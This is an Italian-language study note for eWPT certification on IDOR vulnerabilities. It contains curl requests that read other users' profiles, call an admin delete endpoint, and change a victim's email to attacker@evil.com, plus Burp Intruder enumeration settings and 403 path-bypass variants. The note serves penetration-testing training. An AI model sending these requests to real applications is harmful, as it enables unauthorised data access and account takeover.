# IDOR (Insecure Direct Object Reference)

**Difficolta:** Intermediate
**Time to Master:** 2h
**Prerequisiti:** [03-CSRF-Attacks.md](03-CSRF-Attacks.md)
**Lab:** PortSwigger Academy — Access control

---

## Obiettivo

Identificare endpoint che espongono risorse tramite identificatori diretti (ID numerico, UUID, filename) senza verificare che l'utente autenticato abbia effettivamente diritto ad accedervi. E una delle vulnerabilita piu frequenti e piu redditizie in eWPT.

---

## Concetti chiave

### Pattern tipico

```
GET /api/user/123/profile   <- il tuo profilo, id=123
GET /api/user/124/profile   <- prova a cambiare id: e il profilo di un altro utente?
```

Se la response restituisce dati dell'utente 124 senza errore di autorizzazione, e IDOR.

### Categorie

| Tipo | Esempio |
|------|---------|
| IDOR orizzontale | accedi ai dati di un ALTRO utente allo stesso livello di privilegio |
| IDOR verticale | accedi a funzioni/dati riservati a un livello di privilegio SUPERIORE (es. admin) |

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| Burp Repeater | modifica ID manualmente | risposta con dati di altro utente | principale |
| Burp Intruder | numera automaticamente un range di ID | mappa quali ID rispondono con successo | utile per enumerazione massiva |

---

## Payload / Esempi

### Esempio 1: IDOR orizzontale su parametro numerico

```bash
curl -b "session=TUO_COOKIE" "http://target.com/api/user/123/profile"
curl -b "session=TUO_COOKIE" "http://target.com/api/user/124/profile"
```

**Output atteso:** se entrambe le richieste restituiscono 200 con dati completi (e non un 403/401), l'endpoint non verifica ownership.

### Esempio 2: IDOR su ID non incrementale (UUID) tramite leak in un'altra risposta

```
1. Cerca l'UUID di un'altra risorsa in risposte precedenti (es. lista pubblica, commenti, notifiche)
2. Usa l'UUID trovato direttamente sull'endpoint sensibile
GET /api/document/a1b2c3d4-e5f6-7890-abcd-ef1234567890/download
```

**Spiegazione:** un ID "non indovinabile" (UUID) non e una protezione se l'ID stesso trapela altrove nell'applicazione (notifiche, log pubblici, risposte di altre API).

### Esempio 3: enumerazione massiva con Burp Intruder

```
Payload position: /api/user/§123§/profile
Payload type: Numbers, range 1-1000
```

**Spiegazione:** automatizza il controllo su centinaia di ID in sequenza, filtrando poi per status code 200 e dimensione response diversa dal "not found" standard.

### Esempio 4: IDOR verticale — accesso a funzione admin cambiando solo il path

```bash
curl -b "session=TUO_COOKIE_UTENTE_NORMALE" "http://target.com/admin/users/delete?id=5"
```

**Spiegazione:** verifica sempre se endpoint admin sono raggiungibili anche da un utente con privilegi normali, semplicemente conoscendo il path (spesso "protetti" solo nascondendo il link nell'UI, non lato server).

### Esempio 5: IDOR su richieste POST/PUT (modifica dati di altri)

```bash
curl -b "session=TUO_COOKIE" -X PUT "http://target.com/api/user/124/email" -d "email=attacker@evil.com"
```

**Spiegazione:** l'IDOR non riguarda solo la lettura: la scrittura/modifica di risorse altrui e spesso ancora piu grave (impatto: account takeover).

---

## Evasion / Bypass Techniques

### Bypass controllo autorizzazione basato solo su path esatto

```
/api/user/124/profile         <- 403
/api/user/124/profile/        <- prova con slash finale
/api/User/124/profile         <- case variation
/api/v1/user/124/profile      <- prova versione API diversa
/api/./user/124/profile
```

---

## Lab Hands-On

### Lab 1: PortSwigger — Insecure direct object references
**Obiettivo:** accedere a dati/documenti di un altro utente
**Difficulty:** Medio
**Time:** 30 min

**Walkthrough breve:**
1. Identifica un endpoint con ID diretto nell'URL/body
2. Cambia l'ID con quello di un'altra risorsa/utente
3. Conferma accesso non autorizzato

---

## Common Mistakes

- Testare IDOR solo su GET -> testa sempre anche PUT/POST/DELETE, spesso meno controllati
- Fermarsi al primo endpoint protetto -> un'app puo avere controlli incoerenti tra endpoint diversi, verificane sempre piu di uno
- Non provare IDOR verticale (funzioni admin) -> spesso il controllo di ruolo manca del tutto lato server

---

## Link Utili

- [OWASP — Insecure Direct Object References](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [PortSwigger — Access control vulnerabilities](https://portswigger.net/web-security/access-control)

---

## Connessioni

- **Prerequisito:** [03-CSRF-Attacks.md](03-CSRF-Attacks.md)
- **Prossimo Step:** [05-Credential-Attacks.md](05-Credential-Attacks.md)
- **Combinazione con:** [02-Scanning-Enumeration/05-API-Enumeration.md](../02-Scanning-Enumeration/05-API-Enumeration.md)

---

## Checklist di padronanza

- [ ] So testare IDOR orizzontale e verticale
- [ ] So automatizzare l'enumerazione ID con Burp Intruder
- [ ] Testo sempre lettura E scrittura, non solo GET
- [ ] So bypassare controlli 403 basati su path esatto

---

## Note personali

_(spazio libero)_
